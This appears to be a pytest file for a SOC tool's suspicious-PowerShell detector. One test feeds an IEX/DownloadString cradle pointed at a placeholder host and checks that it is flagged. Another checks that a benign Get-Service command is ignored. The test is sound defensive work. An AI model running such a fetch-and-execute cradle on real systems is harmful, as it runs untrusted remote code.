"""
Tests for suspicious PowerShell detection.
"""

from soc_tool.detections.suspicious_powershell import (
    SuspiciousPowerShellDetector,
)
from soc_tool.models.alert import Alert


def create_powershell_alert(script_text: str) -> Alert:
    return Alert(
        timestamp="2026-07-13T08:49:02.031+0000",
        agent_name="DC01",
        rule_id="91816",
        rule_level=4,
        event_id="4104",
        username=None,
        event_record_id="2001",
        source_ip=None,
        script_block_text=script_text,
        subject_username=None,
        target_domain=None,
        raw_data={},
    )


def test_detect_suspicious_powershell() -> None:
    detector = SuspiciousPowerShellDetector()

    alert = create_powershell_alert(
        "IEX (New-Object Net.WebClient).DownloadString('http://example.test')"
    )

    findings = detector.detect([alert])

    assert len(findings) == 1

    finding = findings[0]

    assert finding["detection"] == "Suspicious PowerShell"
    assert "iex" in finding["matched_patterns"]
    assert "downloadstring" in finding["matched_patterns"]


def test_ignore_benign_powershell() -> None:
    detector = SuspiciousPowerShellDetector()

    alert = create_powershell_alert(
        "Get-Service | Select-Object Name, Status"
    )

    findings = detector.detect([alert])

    assert findings == []